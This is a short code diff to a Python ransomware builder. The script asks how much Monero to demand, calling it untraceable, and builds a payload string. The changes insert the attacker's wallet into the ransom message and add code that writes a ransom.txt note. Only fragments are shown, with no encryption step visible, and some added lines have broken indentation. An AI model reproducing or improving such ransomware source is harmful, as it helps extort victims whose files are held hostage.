@@ -25,7 +25,7 @@ with open(wallet_address, "r") as thewallet:
 quantity = input("How much XMR would you like to ransom? ") # XMR is untraceable
 
 # The payload
-text = f"""
+text = f"""\
 #!/usr/bin/python3.9
 import base64
 import os
@@ -103,9 +103,12 @@ wallet = '''{wallet}'''
 message = '''
 Looks like someone downloaded my ransomware.
 Send {quantity} XMR to the wallet provided.
-'''
 
+{wallet}
+'''
 print(message)
+with open("ransom.txt", "w") as theransom:
+theransom.write(message)
 
 """
 
